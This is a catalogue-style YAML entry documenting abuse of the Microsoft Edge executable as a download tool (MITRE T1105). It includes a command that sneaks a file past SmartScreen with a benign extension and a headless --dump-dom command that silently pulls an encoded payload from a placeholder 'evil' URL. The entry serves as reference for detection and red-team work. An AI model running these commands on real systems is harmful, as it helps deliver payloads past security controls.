---
Name: Msedge.exe
Description: Microsoft Edge browser
Author: mr.d0x
Created: 2022-01-20
Commands:
  - Command: msedge.exe https://example.com/file.exe.txt
    Description: Edge will launch and download the file. A harmless file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.
    Usecase: Download file from the internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
  - Command: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://example.com/evil.b64.html" > out.b64
    Description: Edge will silently download the file. File extension should be .html and binaries should be encoded.
    Usecase: Download file from the internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: c:\Program Files\Microsoft\Edge\Application\msedge.exe
  - Path: c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Resources:
  - Link: https://twitter.com/mrd0x/status/1478116126005641220
  - Link: https://twitter.com/mrd0x/status/1478234484881436672
Acknowledgement:
  - Person: mr.d0x
    Handle: '@mrd0x'
---
